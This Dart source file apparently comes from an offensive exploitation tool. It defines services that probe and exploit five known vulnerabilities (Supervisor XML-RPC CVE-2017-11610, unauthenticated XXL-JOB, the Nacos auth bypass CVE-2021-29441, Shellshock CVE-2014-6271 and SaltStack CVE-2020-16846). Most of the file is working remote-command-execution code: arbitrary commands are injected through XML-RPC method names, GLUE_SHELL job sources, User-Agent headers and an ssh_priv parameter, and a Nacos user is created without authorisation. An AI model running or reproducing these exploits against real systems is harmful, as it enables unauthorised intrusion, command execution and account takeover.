import 'dart:convert';

import 'package:http/http.dart' as http;

import 'exp_result.dart';

class SupervisorExpService {
  final String baseUrl;
  final Duration timeout;

  SupervisorExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlPayload(String cmd) => '''<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param><string>$cmd</string></param>
</params>
</methodCall>''';

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload('echo supervisord_54289'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(
          true,
          'CVE-2017-11610',
          'Supervisor XML-RPC 端点可访问 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-11610', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class XxlJobExpService {
  final String baseUrl;
  final Duration timeout;

  XxlJobExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': '',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': 1586629003729,
        'glueType': 'GLUE_SHELL',
        'glueSource': 'echo xxljob_54289',
        'glueUpdatetime': 1586699003758,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('200')) {
        return ExpResult(true, 'XXL-JOB 未授权 RCE', '执行器接口未授权，命令提交成功');
      }
    } catch (_) {}
    return const ExpResult(false, 'XXL-JOB 未授权 RCE', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': '',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': DateTime.now().millisecondsSinceEpoch,
        'glueType': 'GLUE_SHELL',
        'glueSource': cmd,
        'glueUpdatetime': DateTime.now().millisecondsSinceEpoch,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }
}

class NacosExpService {
  final String baseUrl;
  final Duration timeout;

  NacosExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base/nacos/v1/auth/users?pageNo=1&pageSize=9'),
        headers: {'User-Agent': 'Nacos-Server'},
      ).timeout(timeout);
      if (res.statusCode == 200 &&
          (res.body.contains('username') || res.body.contains('pageItems'))) {
        return ExpResult(
          true,
          'CVE-2021-29441',
          '认证绕过成功，获取用户列表:\n${res.body}',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-29441', '');
  }

  Future<String?> listUsers() async {
    try {
      final res = await http.get(
        Uri.parse('$_base/nacos/v1/auth/users?pageNo=1&pageSize=100'),
        headers: {'User-Agent': 'Nacos-Server'},
      ).timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }

  Future<String?> createUser(String username, String password) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/nacos/v1/auth/users'),
            headers: {
              'User-Agent': 'Nacos-Server',
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'username=$username&password=$password',
          )
          .timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }
}

class ShellshockExpService {
  final String baseUrl;
  final String cgiPath;
  final Duration timeout;

  ShellshockExpService({
    required this.baseUrl,
    this.cgiPath = '/cgi-bin/test.cgi',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base$cgiPath'),
        headers: {'User-Agent': '() { :; }; echo; echo SHELLSHOCK_54289'},
      ).timeout(timeout);
      if (res.body.contains('SHELLSHOCK_54289')) {
        return ExpResult(
          true,
          'CVE-2014-6271 (Shellshock)',
          'Shellshock 存在，环境变量注入验证通过',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2014-6271 (Shellshock)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http.get(
        Uri.parse('$_base$cgiPath'),
        headers: {'User-Agent': '() { :; }; echo; $cmd'},
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class SaltstackExpService {
  final String baseUrl;
  final String token;
  final Duration timeout;

  SaltstackExpService({
    required this.baseUrl,
    this.token = '',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(Uri.parse('$_base/')).timeout(timeout);
      if (res.statusCode == 200 &&
          (res.body.contains('salt') ||
              res.body.contains('SaltStack') ||
              res.body.contains('"status"'))) {
        return ExpResult(
          true,
          'CVE-2020-16846',
          'SaltStack API 端点可访问 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2020-16846', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final body =
          'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|${Uri.encodeComponent(cmd)};';
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: body,
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}
